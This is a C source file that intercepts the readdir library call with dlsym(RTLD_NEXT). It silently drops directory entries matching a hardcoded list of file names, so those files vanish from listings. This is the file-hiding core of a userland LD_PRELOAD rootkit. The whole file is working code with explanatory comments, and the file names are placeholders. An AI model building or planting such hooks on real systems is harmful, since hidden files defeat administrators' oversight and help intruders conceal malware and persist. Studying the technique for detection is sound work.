#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// Pointer to original readdir function is initialized to NULL
struct dirent* (*original_readdir)(DIR *) = NULL;

const char *hidden_files[] = {
    "hidden_file1.txt",
    "hidden_file2.txt",
    "hidden_file3.txt"
};

// Macro that calculates the number of files to hide
#define HIDDEN_FILES_COUNT (sizeof(hidden_files) / sizeof(hidden_files[0]))

// Compares the filename with the names in the hidden_files list
int is_hidden(const char *filename) {
    for (int i = 0; i < HIDDEN_FILES_COUNT; ++i) {
        if (strcmp(filename, hidden_files[i]) == 0) {
            return 1;
        }
    }

    return 0;
}

// Function being intercepted or "hooked"
struct dirent* readdir(DIR *dirp) {
    // If original_readdir is not initialized, it will be obtained using dlsym
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    // The function continues calling the original readdir until a non-hidden file is found, or until there are no more files
    struct dirent* dir;
    do {
        dir = original_readdir(dirp);
    } while (dir && is_hidden(dir->d_name));

    return dir;
}

